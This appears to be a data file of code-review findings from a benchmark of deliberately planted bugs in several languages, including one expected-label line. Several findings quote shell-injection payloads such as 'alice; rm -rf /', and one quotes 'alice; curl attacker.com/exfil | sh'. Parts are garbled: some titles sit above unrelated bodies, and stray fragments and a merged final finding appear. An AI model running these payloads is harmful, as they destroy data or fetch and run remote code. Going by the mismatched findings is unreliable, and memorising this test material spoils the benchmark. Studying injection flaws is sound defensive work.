findings.title: Lowercasing the id breaks exact-match lookups for mixed-case ids

findings.body: The committed specification states: 'Report commands shall pass user names as arguments without a shell.' The change replaces the direct `Command::new("report").args(["--user", user])` invocation with `Command::new("sh").args(["-c", command.as_str()])`, which runs the command through a shell. This directly contradicts the explicit SHALL requirement. Additionally, the user name is interpolated into a shell command string, creating a command-injection risk if the user name contains shell metacharacters (e.g., `;`, `|`, `$()`). The spec's intent is to avoid shell interpretation entirely.
findings.failure_scenario: A user name such as `alice; rm -rf /` is passed to `render_report`. The `format!` macro embeds it into the command string, and `sh -c` interprets the semicolon, executing the injected command. This violates the spec's no-shell requirement and enables arbitrary command execution.
findings.title: Spec requires passing user names without a shell; change introduces a shell

findings.body: The user-supplied `user` string is interpolated into a shell command and executed via `sh -c`. Any shell metacharacters in `user` (e.g. `;`, `$(...)`, backticks) are interpreted by the shell, allowing arbitrary command execution. Use the direct `Command` form with separate arguments instead of a shell. Also remove the now-unused `command` binding on line 4.
findings.failure_scenario: If `user` is `alice; rm -rf /`, the shell executes `report --user alice` then `rm -rf /`, causing arbitrary command execution.
findings.title: Avoid shell interpolation to prevent command injection

findings.body: render_report now drops the first input row (rows.into_iter().skip(1).collect()), but the updated test only asserts the result is non-empty. A regression that removed the skip, returned the wrong rows, or returned extra rows would still pass, so the new transformation is effectively untested. The previous test verified the exact output; the replacement weakens that guarantee without covering the changed behaviour.
findings.title: Add coverage for the new skip(1) row transformation

findings.body: The change replaces `repo.load_many(ids)` — a single batched load — with a loop that calls `repo.load(*id)` once per element. Each iteration issues its own query/round-trip, so the cost now scales linearly with the number of ids instead of being amortised. This is the classic N+1 pattern and a regression on the hot path for any non-trivial input size. The filtering added by the change can be applied after a single batched load.
findings.failure_scenario: When `ids` is large, `enrich` performs one repository load (database round-trip) per id, multiplying latency in proportion to input size and potentially exhausting the connection pool, whereas the previous implementation made one batched call.
findings.title: Batch the per-id loads back into a single query

findings.body: `VecFactory` is a speculative abstraction that adds a whole type and impl just to call `Vec::new()`. It has exactly one caller (`enrich`) and hides nothing — `VecFactory::create()` is longer and less obvious than the builtin it wraps. YAGNI: delete the struct and use `Vec::new()` directly.
findings.title: Drop the single-use VecFactory wrapper

findings.body: Calling std::mem::uninitialized() and then reading the value is undefined behavior in Rust: it creates a value of type UserRecord from uninitialized memory, and passing it to UserRecord::merge reads that memory. Even if merge overwrites the field, the mere creation and potential drop of an uninitialized value is UB. This can cause crashes, memory unsafety, or miscompilation depending on the optimizer. Use std::mem::MaybeUninit if truly needed, but here the value should simply be constructed normally (e.g. UserRecord::new(id, timeout_ms)) since the scratch value is only used to be merged.
findings.failure_scenario: Any call to fetch_user triggers the unsafe block, and the compiler is free to assume the uninitialized value is valid, leading to undefined behavior, crashes, or data corruption at runtime.
findings.title: Replace std::mem::uninitialized with safe construction

Existing callers passing Option<u64> or expecting a UserRecord return will fail to compile. This directly contradicts the stated intent of preserving source compatibility.

findings.body: The access check and the final open are separate operations. The candidate path is canonicalized and verified with strip_prefix, and only then File::open(candidate) is called, which re-parses that same path. Between the canonicalize+check and the open, an actor with write permission to any parent directory of the verified path could replace a directory component with a symlink, causing File::open to resolve outside the checked location. The canonicalized path is only a starting point for a fresh traversal; it does not pin the open to the directory the check was performed on. This is a check-then-use (TOCTOU) race on the very security boundary the change tries to enforce.
findings.failure_scenario: An attacker who can write to one of the directories holding components of the canonicalized candidate swaps that directory for a symlink to an external absolute directory (for example /etc) after canonicalize() runs but before File::open() executes. The open() syscall then follows the symlink and reads a file outside root, so the strip_prefix check had already passed.
findings.title: TOCTOU race can bypass the new path checks

findings.body: The `user` parameter is interpolated directly into a shell command string that is executed via `sh -c`. An attacker who controls `user` can inject arbitrary shell commands. For example, a value like `alice; rm -rf /` would execute `rm -rf /` on the host. This is a classic OS command injection vulnerability (CWE-78).
findings.failure_scenario: An attacker passes a malicious `user` string (e.g., `alice; curl attacker.com/exfil | sh`) that gets executed by the shell, leading to arbitrary code execution with the privileges of the process.
findings.title: Command injection via shell interpolation of user input

findings.body: The change replaces the safe argument-list invocation with `sh -c` and interpolates `user` directly into the command string. Any shell metacharacter in `user` (spaces, `;`, `$`, backticks, etc.) is interpreted by the shell, allowing arbitrary command execution. The original `Process.run('report', ['--user', user])` passed the value as a single argument and was safe. Use the argument-list form and remove the now-unused `command` variable.
findings.failure_scenario: If `user` is `alice; rm -rf /`, the shell executes `report --user alice` then `rm -rf /`, compromising the host.
findings.title: Avoid shell interpolation of user input

findings.body: The change from `return rows;` to `return rows.sublist(1);` silently discards the first element of the `rows` list. If `rows` is empty, this throws a `RangeError`. If `rows` is non-empty, the first row is dropped, which may be unintended behavior and could cause data loss or incorrect report output. The original code returned all rows unchanged.
findings.failure_scenario: When `rows` is empty, `sublist(1)` throws an unhandled `RangeError`, crashing the caller. When `rows` is non-empty, the first row is silently omitted from the report, leading to missing data.
findings.title: Silent data loss: dropping first row from output

findings.body: The test was changed from asserting the exact returned rows to only checking that the result is not null. This weakens the test's ability to catch regressions in the function's return value. The original test verified that `renderReport` returns the rows unchanged; the new test would pass even if the function returned an empty list or dropped data.
findings.failure_scenario: A future change breaks the return value of `renderReport` (e.g., returns an empty list), but the test still passes because it only checks for non-null, allowing the regression to go undetected.
findings.title: Test weakened: no longer verifies returned rows

findings.body: `rows.sublist(1)` removes the first element from the list, so the function no longer preserves the input rows as the commit message claims. It also throws a `RangeError` when `rows` is empty. If the intent is to preserve rows, return `rows` directly; if a header row is meant to be skipped, guard against an empty list first.
findings.failure_scenario: Calling `renderReport('alice', [])` throws `RangeError`; calling it with `['first', 'second']` returns `['second']`, silently losing the first row.
findings.title: Return all rows instead of dropping the first

findings.body: The old implementation returned repository.loadMany(ids) verbatim, so every item for the requested ids came back. The new loop only adds an item when item.active is true AND item.owner is non-null AND item.owner.enabled is true. That is a semantic change: items that are inactive, ownerless, or owned by a disabled owner are now silently omitted from the result. If any caller relies on receiving all items for the given ids (e.g. to render, count, or reconcile them), this filtering changes behaviour without any stated intent mentioning it. The commit message ('plant dart-efficiency-design-v1') does not describe a filtering change, so this looks like an unintended behaviour shift rather than a deliberate feature.
findings.failure_scenario: A caller passes ids for items that are inactive or whose owner is disabled; previously those items were returned, now they are absent from the list, so downstream logic that expected them (display, aggregation, or validation) silently sees fewer items.
findings.title: enrich now silently drops items that loadMany previously returned

findings.body: The previous implementation used repository.loadMany(ids) in a single call. The new loop calls repository.load(id) once per id, turning one batched operation into N round-trips. This is an N+1 regression whose cost grows linearly with the number of ids and is especially costly if load() hits a database or network.
findings.failure_scenario: When ids contains many entries, enrich() issues one load per id, multiplying latency and load on the repository; with a large list this can exhaust connections or time out.
findings.title: Batch the item loads instead of loading one at a time

findings.body: The change replaces a safe ProcessBuilder invocation with Runtime.exec("/bin/sh", "-c", "report --user " + user). The user string is interpolated directly into a shell command line, so any shell metacharacters in the user value are interpreted by the shell. This is a classic command-injection vulnerability: a user named e.g. "alice; rm -rf /" would execute the trailing command. The original code passed the user as a separate argument to ProcessBuilder, which avoided shell interpretation. The fix is to keep using ProcessBuilder with the user as a distinct argument, or to validate/escape the user value before shell interpolation. Note that the diff does not show any sanitization of the user input elsewhere, so the injection risk is real on the changed line itself.
findings.failure_scenario: A caller passes a user string containing shell metacharacters (e.g. "alice; touch /tmp/pwned"). The shell executes the injected command, leading to arbitrary command execution on the server with the service's privileges.
findings.title: Fix command injection via shell interpolation of user input

findings.body: The change replaces `return rows;` with `return rows.subList(1, rows.size());`. If `rows` is empty, `subList(1, 0)` throws IndexOutOfBoundsException because the fromIndex (1) is greater than the toIndex (0). The original code returned the list as-is, so this is a new crash path. The diff does not show any guard ensuring rows is non-empty before this call. If the caller can pass an empty list, the service now throws instead of returning.
findings.failure_scenario: A caller invokes render with an empty rows list. The subList(1, 0) call throws IndexOutOfBoundsException, crashing the service instead of returning an empty result.
findings.title: Guard against empty rows before calling subList(1, ...)

findings.body: The test was changed from asserting the exact returned list to only asserting non-null. This removes the only check that render() returns the expected rows, so the subList regression (dropping the first row) and any other content changes go undetected. The test should assert the actual expected content.
findings.failure_scenario: render() returns a wrong or truncated list; the test still passes because it only checks non-null, so the regression ships unnoticed.
findings.title: Weakened test no longer verifies returned rows

findings.body: The new loop calls repository.load(id) per id and immediately dereferences the result with item.active(). If load can return null for a missing or unknown id, this throws NullPointerException and aborts the entire enrichment. The previous implementation used repository.loadMany(ids), which may have handled absent ids differently. If load is guaranteed to return a non-null item for every id, this is fine; otherwise the result needs a null check before use.
findings.failure_scenario: When ids contains an id with no corresponding record and repository.load returns null, item.active() throws NullPointerException, aborting enrichment for all ids instead of skipping the missing one.
findings.title: Guard against a null item from repository.load

findings.body: The change replaces the single batched `repository.loadMany(ids)` call with a per-id `repository.load(id)` inside the loop, turning one query into N queries. This is an N+1 regression that scales linearly with the number of ids.
findings.failure_scenario: When `ids` is large, each iteration issues a separate database round-trip, increasing latency and potentially exhausting the connection pool.
findings.title: Batch the per-id loads back into a single loadMany call

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The new fetch method returns Map.Entry<User, Integer> and calls Map.entry(...), but the diff only adds import java.util.Date. If java.util.Map and java.util.Map.Entry are not already imported in this file, the code will not compile. The diff does not show any existing imports for Map or Map.Entry, so this is a likely compile error.
findings.failure_scenario: When the file is compiled, Map.Entry and Map are unresolved symbols, causing a compilation failure and breaking the build.
findings.title: Use java.util.Map.Entry and java.util.Map imports

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: Date.toGMTString() is deprecated since Java 1.1 and uses the obsolete GMT timezone with a non-standard format. It also silently ignores the local timezone, producing a string that may not match the intended user timestamp. Prefer java.time.Instant or SimpleDateFormat with an explicit UTC timezone.
findings.failure_scenario: A caller relying on the timestamp string gets a deprecated, non-localized representation that may differ from the expected format, and the code triggers deprecation warnings.
findings.title: Replace deprecated Date.toGMTString() with a timezone-safe formatter

findings.body: The new code applies toLowerCase() to the user id before binding it to the prepared statement. If the underlying database collation is case-sensitive, or if user ids are case-sensitive identifiers, this changes the lookup semantics and can return no rows or the wrong row for ids that contain uppercase characters. The original query did not transform the input. If case-insensitive matching is intended, it should be done in SQL (e.g. LOWER(id) = LOWER(?)) so the database can still use an index on the column; otherwise the transformation should be removed.
findings.failure_scenario: A user with id 'AbC123' is stored as 'AbC123'. The caller passes 'AbC123', the code converts it to 'abc123', and the query returns no rows because the stored value is not lowercased.
findings.title: Lowercasing the user id may break case-sensitive lookups

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The PreparedStatement created on this line is never closed. Per the JDBC spec, closing the returned ResultSet does not close its Statement, so every call to find() leaks a statement and its server-side resources until the Connection is closed. Under sustained load this can exhaust the database's statement or connection-pool resources. The statement should be closed by the caller once the ResultSet is consumed, or the method should consume the ResultSet internally instead of returning it.
findings.failure_scenario: Repeated calls to find() open PreparedStatements that are never released; under sustained load the database or connection pool runs out of statement resources and subsequent queries fail.
findings.title: Close the prepared statement to avoid a resource leak

findings.body: The spec requires report commands to pass user names as arguments without a shell. This change invokes `sh -c` with the user string concatenated into the command line, which both violates that requirement and introduces a command-injection vector: any shell metacharacters in `user` are interpreted by the shell. Use the argument form of exec.Command instead.
findings.failure_scenario: If `user` contains characters such as `;`, `|`, or backticks (e.g. `alice; rm -rf /`), the shell executes them as additional commands, allowing arbitrary command execution on the host.
findings.title: Pass user as argument without a shell; do not use sh -c

findings.body: The change returns rows[1:], which removes the first row and panics if rows is empty. The stated intent is to preserve report rows, so this is incorrect. The test was weakened and no longer catches this.
findings.failure_scenario: If rows is empty, Render panics with slice bounds out of range; if rows has data, the first row is silently dropped, contradicting the 'preserve' intent.
findings.title: Return all rows instead of rows[1:] to avoid dropping data and panicking on empty input

findings.body: The rewritten test only checks that Render returns a non-nil result, so it passes even if Render drops rows, returns the full input or stumbles. Now that the implementation is being meaningfully changed to return rows[1:], the test should assert the exact length and content so the new path is actually fixed.
findings.title: Assert the returned slice, not just non-nil

findings.body: Switching the workflow trigger from `pull_request` to `pull_request_target` causes it to run in the context of the base repository with access to its secrets, including `RELEASE_TOKEN`. Combined with the explicit checkout of `github.event.pull_request.head.sha` and the secret being exposed to the `npm test` step, any pull request from a fork can execute arbitrary untrusted code under those credentials. This allows a malicious PR to exfiltrate `RELEASE_TOKEN` via modified test scripts or `package.json` hooks — a classic supply-chain attack vector. The workflow should never run untrusted code with secrets; if secrets must be available, use a trusted scope (e.g., `pull_request` for same-repo PRs or a dedicated environment) and never check out the fork head under `pull_request_target`.
findings.failure_scenario: A fork PR modifies `package.json` to include a postinstall or test script that reads `process.env.RELEASE_TOKEN` and sends it to an attacker-controlled endpoint. The review workflow, triggered by `pull_request_target`, checks out that head commit and runs `npm test`, causing the secret to be leaked.
findings.title: Do not run untrusted fork code with secrets via pull_request_target

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The command is built by string interpolation and executed with shell=True, so user_name is parsed by the shell. Any shell metacharacter in user_name (e.g. `;`, `&&`, `$()`) allows arbitrary command execution with the process's privileges. The previous list form passed the argument without shell parsing and was safe. Replace the two lines with a single list call and drop the now-unused `command` variable.
findings.failure_scenario: A caller passes user_name like `alice; rm -rf /`; the shell executes the injected command, deleting files or running arbitrary commands.
findings.title: Remove shell=True to avoid command injection

findings.body: The spec states: "Rendering shall preserve every input row in order." This change returns rows[1:], which removes the first element of the input list. The previous code returned rows unchanged and satisfied the requirement; the new code silently corrupts the output.
findings.failure_scenario: A caller passing rows = ["first", "second"] receives ["second"], so the rendered report is missing its first row, contradicting the preservation contract.
findings.title: return rows[1:] drops the first row; rendering must preserve every input row

findings.body: The new test only asserts that the result is not None, which is always true for a list, so it provides no coverage of the changed behavior. You will need to add `from unittest.mock import patch` to the test file.

findings.body: user_id is a database identifier, not a filesystem path. PurePath(user_id).name strips directory components and treats platform-specific separators, so any ID containing '/', '\', or a trailing separator is silently rewritten before the query. This makes the lookup target a different user than the caller intended, and on Windows the result differs from POSIX. If user_id is attacker-controlled, a value like 'alice/../bob' resolves to 'bob', potentially exposing another user's record. Remove the normalization and pass user_id directly.
findings.failure_scenario: A caller passes user_id='alice/../bob' expecting the user with that literal ID; the query runs with 'bob' and returns Bob's record instead of raising or returning nothing, which can leak data if the result is used for authorization.
findings.title: Do not normalize user_id with PurePath

findings.body: The change replaces the safe spawnSync("report", ["--user", userName], { stdio: "pipe" }) call with execSync(`report --user ${userName}`). execSync runs the command through the shell and interpolates userName directly into the command string, so any shell metacharacter in the userName argument is interpreted. This is the opposite of the spec requirement that report commands avoid shell interpretation and introduces a command-injection vector. Restore the array-argument form and the spawnSync import so the user value is passed as a literal argument rather than a shell token.
findings.failure_scenario: If a caller passes a userName containing shell metacharacters (for example alice; touch /tmp/pwned), execSync interprets them as part of the command string and executes arbitrary shell commands instead of passing the string as a single argument to report.
findings.title: Avoid shell interpretation: use spawnSync with an argument array instead of execSync

findings.body: The change builds a shell command by string interpolation and passes it to execSync, which runs it through a shell. userName is user-controlled input, so a value containing shell metacharacters (e.g. `; rm -rf /` or `$(...)`) will be executed as part of the command. The previous spawnSync call passed arguments as an array, avoiding shell interpretation. This is a command-injection vulnerability introduced by the change.
findings.failure_scenario: If userName is 'alice; touch /tmp/pwned', execSync executes 'report --user alice; touch /tmp/pwned', running the injected command on the host.
findings.title: Command injection via userName in execSync

findings.body: The spec requires rendering to preserve every input row in order. Returning rows.slice(1) drops the first row of the input, directly contradicting that acceptance criterion. The function should return all rows unchanged.
findings.failure_scenario: renderReport("alice", ["first", "second"]) returns ["second"], so the first report row is silently lost.
findings.title: Return all rows, not rows.slice(1), to satisfy the preservation requirement

findings.body: The test was weakened from a precise equality check to a vacuous toBeDefined() assertion. The function now returns rows.slice(1), so the correct expectation is ["second"]. As written, the test passes for any non-undefined return value, so a regression in the slicing logic (or in the execSync call) would ship silently. The new behavior introduced in report.ts is therefore effectively untested.
findings.title: Assert the actual sliced output instead of toBeDefined()

findings.body: The change replaces a single repo.loadMany(ids) call with a loop that awaits repo.load(id) once per id. If repo.load performs a database query or network request per call, this introduces an N+1 pattern: the cost now scales linearly with the number of ids, and each iteration adds a round-trip. The original loadMany(ids) already existed and presumably batches the loads, so the per-item loop is a regression in the hot path. If loadMany cannot be used because filtering must happen per item, consider loading all items in one call and filtering the returned array in memory instead of issuing one call per id.
findings.failure_scenario: When ids is large, the function issues one database/network round-trip per id instead of one batched call, increasing latency and potentially exhausting the connection pool or rate limits.

findings.body: The old signature `fetchUser(id: string, timeoutMs = 30_000)` allowed callers to omit the timeout argument. The new signature `fetchUser(id: string, timeoutMs: number)` requires it, so any existing call site that invoked `fetchUser(id)` without a timeout will now fail to compile. The commit message says the change is meant to "retain fetchUser compatibility", but removing the default parameter is the opposite of retaining compatibility.
findings.failure_scenario: A caller that previously used `fetchUser('abc')` now gets a TypeScript compile error because the required `timeoutMs` argument is missing.

findings.body: The change replaces `new Date().toISOString()` with `new Date().toGMTString()`. `toGMTString` is deprecated in favour of `toUTCString`, and unlike `toISOString` it produces a locale-dependent, non-ISO-8601 string (e.g. "Thu, 01 Jan 1970 00:00:00 GMT"). If downstream code parsed the previous ISO format, this is a silent format change. The commit message only mentions refactoring for compatibility, so this format change is unexplained.
findings.failure_scenario: A consumer that parsed `fetchedAt` as an ISO-8601 string now receives a different format and may fail to parse it.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];

findings.body: The new code builds a shell command by interpolating `userName` directly into a string passed to `execSync`. Unlike the previous `spawnSync` with an argument array, `execSync` runs the string through a shell, so any shell metacharacters in `userName` (e.g. `;`, `&&`, backticks, `$()`) are executed. This is a command-injection vulnerability. If `userName` is attacker-controlled, arbitrary commands run on the host. Even if it is not attacker-controlled, a user name containing a space or shell character breaks the command. Prefer `spawnSync` with an argument array, or at minimum validate/escape the input.
findings.failure_scenario: A caller passes `userName` equal to `alice; rm -rf /`; `execSync` runs `report --user alice; rm -rf /`, deleting files on the host.
findings.title: Command injection via userName in execSync

findings.body: The new test `returns rows` uses `toBeTruthy()`, which only checks that the result is truthy. It would pass even if `renderReport` returned an empty array, `null` (if not), or any non-empty value, and it does not verify that the first row is dropped. This is a weak assertion that does not test the actual behaviour. Replace it with an exact equality check on the expected output.
findings.title: Test is too weak: toBeTruthy does not verify the return value

findings.body: The spec requires that report commands not interpolate input into a shell, but this change builds a command string with userName and passes it to execSync, which runs it through a shell. Any shell metacharacters in userName (e.g. ';', '&&', backticks) will be executed. Use spawnSync with an argument array instead, and restore the import: import { spawnSync } from 'node:child_process'; then replace the const command and execSync lines with spawnSync('report', ['--user', userName]).
findings.failure_scenario: If userName is 'alice; rm -rf /', execSync executes the injected command in the shell, causing arbitrary command execution.
findings.title: Do not interpolate userName into a shell command

findings.body: The change replaces a single repository.loadMany(ids) call with a loop of per-id repository.load(id) calls. This is a behavioural change beyond the stated intent ('plant javascript-efficiency-design-v1'): it turns a batched load into N sequential round-trips, which is typically less efficient, and it changes error semantics (a failure in one load aborts the whole loop instead of whatever loadMany did). If the repository's loadMany provided batching or atomicity, this regresses it.
findings.failure_scenario: For a large ids array, the loop issues N sequential awaits, increasing latency and load on the repository compared to the previous single loadMany call; a single failing id aborts the entire enrich call.
findings.title: Sequential awaits lose loadMany batching and change error semantics

findings.body: The change replaces a single `repository.loadMany(ids)` call with a loop that calls `repository.load(id)` once per id. If `load` performs a database query or network request, this introduces an N+1 query pattern where the cost scales linearly with the number of ids, and each round-trip adds latency. The original `loadMany` was presumably designed to batch these loads efficiently.
findings.failure_scenario: When `ids` contains many entries, the function issues one database round-trip per id instead of a single batched query, increasing total latency and potentially exhausting the connection pool under load.
findings.suggestion:
const items = await repository.loadMany(ids);
    return items.filter(item => item.active && item.owner && item.owner.enabled);

findings.anchor: return db.query("SELECT * FROM users WHERE id = ?", [normalizedId]);
findings.body: The change lowercases and trims the input userId, but the SQL query still compares the raw id column to the normalized value. If the stored id values are not already lowercase and trimmed (e.g., 'Alice' or ' Alice'), the lookup will return no rows for a valid user. To make the lookup case-insensitive, the query should also normalize the column, e.g., WHERE LOWER(id) = LOWER(?) or use a case-insensitive collation. If the schema guarantees normalized values, this is fine, but the change alone does not guarantee matching.
findings.failure_scenario: If the users table stores id as 'Alice' and a caller passes 'alice', normalizedId becomes 'alice', and the query `WHERE id = 'alice'` returns no rows, so findUser returns undefined even though the user exists.
findings.suggestion: return db.query("SELECT * FROM users WHERE LOWER(id) = LOWER(?)", [normalizedId]);
findings.title: Normalize both sides of the comparison or use a case-insensitive query

findings.body: The change invokes the report command through `sh -c` with the user value interpolated into a command string. This introduces a command-injection vulnerability: any shell metacharacters in `user` (e.g. `;`, `|`, `$()` or backticks) will be executed by the shell. It also makes the code depend on a POSIX shell, which breaks on Windows and other environments without `sh`. The previous code used `Command::new("report").args(["--user", user])` which passes the value safely as an argument. Replace the shell invocation with the direct arg-based call (and remove the now-unused `let command` line).
findings.failure_scenario: Passing `user = "alice; touch /tmp/pwned"` causes the shell to execute `report --user alice` and then `touch /tmp/pwned`, giving the caller arbitrary command execution.
findings.title: Avoid sh -c interpolation; pass user as an argument

findings.body: The new code discards the first element of `rows` via `.skip(1)`. The commit message states the intent is to preserve report rows, but this change drops data. The original function returned the input `rows` verbatim. Unless the first row is a header that should intentionally be removed (which is not stated in the intent), this is an unrequested behavior change that loses report data. The new loop only pushes items that are active and whose owner is Some and enabled, silently dropping inactive items and items without an enabled owner.
